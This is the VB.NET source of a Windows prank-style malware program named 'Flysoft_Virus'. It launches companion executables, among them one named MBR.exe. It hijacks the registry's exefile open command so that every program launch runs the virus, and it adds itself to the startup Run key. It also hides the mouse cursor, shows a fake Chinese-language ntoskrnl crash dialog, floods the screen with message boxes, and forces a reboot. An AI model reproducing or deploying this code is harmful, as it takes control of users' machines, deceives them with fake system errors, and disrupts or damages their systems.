Imports System.IO
Imports Microsoft.Win32

Public Class Form
    Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Integer, ByVal dwReserved As Integer) As Integer
    Const EWX_FORCE As Short = 4
    Const EWX_LOGOFF As Short = 0
    Const EWX_REBOOT As Short = 2
    Const EWX_SHUTDOWN As Short = 1
    Private Sub Form_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.MouseEnter
        Cursor.Hide()
    End Sub

    Private Sub Form_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Shell(Application.StartupPath & "\MBR.exe")
        Shell(Application.StartupPath & "\Suidao.exe")
        Shell(Application.StartupPath & "\Error.exe")
        Shell(Application.StartupPath & "\Color.exe")
        Dim exeregname As RegistryKey = Registry.ClassesRoot.OpenSubKey("exefile\shell\open\command", True)
        exeregname.SetValue("IsolatedCommand", Application.StartupPath & "\Flysoft_Virus.exe")
        exeregname.SetValue("", Application.StartupPath & "\Flysoft_Virus.exe")
        NotifyIcon.ShowBalloonTip(7000, "病毒防护", "  ", ToolTipIcon.Warning)
        Me.ClientSize = New System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width.ToString, Screen.PrimaryScreen.Bounds.Height.ToString)
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        MsgBoxTimer.Start()
            Dim regname As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\Currentversion\Run", True)
            regname.SetValue("Flysoft_Virus", Application.StartupPath & "\Flysoft_Virus.exe")
            If Not MsgBox(Chr(34) + "0x00000000" + Chr(34) + "指令引用的" + Chr(34) + "0x00000000" + Chr(34) + "内存。该内存不能为" + Chr(34) + "written" + Chr(34) + "。" + Chr(10) + Chr(10) + "要终止程序，请单击" + Chr(34) + "确定" + Chr(34) + "。" + Chr(10) + "要调试程序，请单击" + Chr(34) + "取消" + Chr(34) + "。", vbCritical + vbOKCancel, "ntoskrnl.exe - 应用程序错误") = vbOK Then
                MsgBox("调试失败：没有可用的应用程序来调试。", vbCritical, "调试错误")
            End If
            Shell(Application.StartupPath & "\Ctrl.exe")
            NetTimer.Start()
    End Sub

    Private Sub NetTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NetTimer.Tick
        NetTimer.Stop()
        Me.TopMost = False
        Me.Hide()
        Chrome.ShowDialog()
        Me.Show()
        Me.TopMost = True
    End Sub

    Private Sub MsgBoxTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MsgBoxTimer.Tick
        MsgBoxTimer.Stop()
        NetTimer.Start()
        MsgBox("我是 Flysoft!!!!!!")
        MsgBox("我是 Flysoft!!!!!!")
        MsgBox("我是 Flysoft!!!!!!")
        MsgBox("我是 Flysoft!!!!!!")
        MsgBox("我是 Flysoft!!!!!!")
        MsgBox("我是 Flysoft!!!!!!")
    End Sub

    Private Sub DialogTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DialogTimer.Tick
        Shell(Application.StartupPath & "\Access Denied.exe")
    End Sub
    Private Sub ShutdownTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownTimer.Tick
        ShutdownTimer.Stop()
        ExitWindowsEx(EWX_REBOOT, 0)
    End Sub
End Class
